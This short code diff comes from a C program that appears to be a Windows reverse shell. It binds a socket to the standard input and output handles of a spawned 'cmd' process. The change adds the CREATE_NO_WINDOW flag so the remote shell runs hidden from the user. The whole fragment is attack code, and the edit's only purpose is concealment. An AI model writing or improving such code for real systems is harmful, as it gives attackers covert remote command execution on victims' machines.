@@ -77,7 +77,7 @@ int main(void) {
 	si.hStdOutput = (HANDLE)sockt;
 	si.hStdError = (HANDLE)sockt;
 	PROCESS_INFORMATION pi;
-	CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
+	CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
 #endif
 
 	return (0);
